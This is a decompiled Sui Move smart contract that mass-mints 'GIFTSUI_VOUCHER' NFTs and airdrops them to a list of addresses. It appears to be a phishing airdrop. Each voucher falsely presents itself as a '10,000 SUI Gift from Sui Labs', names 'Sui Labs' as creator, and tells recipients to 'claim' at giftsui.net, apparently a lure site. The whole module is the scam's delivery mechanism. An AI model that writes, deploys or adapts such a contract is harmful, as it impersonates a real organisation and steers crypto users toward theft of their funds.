module 0xf4ba2f9a07c5d714da4c749284e875d357a81423430aa28537f0b88cc1808cd4::giftsui {
    struct GIFTSUI has drop {
        dummy_field: bool,
    }

    struct GIFTSUI_VOUCHER has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct BurnEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public entry fun Gift10000Sui(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = GIFTSUI_VOUCHER{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"10000 SUI Gift"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/giftsuinet_0807/giftsuinet_0807_0.jpg"),
                description : 0x1::string::utf8(b"This is a voucher for 10,000 SUI Gift from Sui Labs. Claim at https://giftsui.net"),
                Reward      : 0x1::string::utf8(b"10000 SUI"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<GIFTSUI_VOUCHER>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"10000 SUI Gift"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/giftsuinet_0807/giftsuinet_0807_0.jpg"),
                description : 0x1::string::utf8(b"This is a voucher for 10,000 SUI Gift from Sui Labs. Claim at https://giftsui.net"),
                Reward      : 0x1::string::utf8(b"10000 SUI"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<GIFTSUI_VOUCHER>(v0, 0x1::vector::pop_back<address>(&mut arg0));
        };
    }

    public entry fun burn_nft(arg0: GIFTSUI_VOUCHER, arg1: &mut 0x2::tx_context::TxContext) {
        let GIFTSUI_VOUCHER {
            id          : v0,
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        } = arg0;
        let v5 = v0;
        let v6 = BurnEvent{
            nft_id      : 0x2::object::uid_to_inner(&v5),
            user        : 0x2::tx_context::sender(arg1),
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        };
        0x2::event::emit<BurnEvent>(v6);
        0x2::object::delete(v5);
    }

    fun init(arg0: GIFTSUI, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"10000 SUI Gift"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suicamp.b-cdn.net/giftsuinet_0807/giftsuinet_0807_0.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"This is a voucher for 10,000 SUI Gift from Sui Labs. Claim at https://giftsui.net"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://giftsui.net"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Sui Labs"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"10000 SUI"));
        let v4 = 0x2::package::claim<GIFTSUI>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<GIFTSUI_VOUCHER>(&v4, v0, v2, arg1);
        0x2::display::update_version<GIFTSUI_VOUCHER>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<GIFTSUI_VOUCHER>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

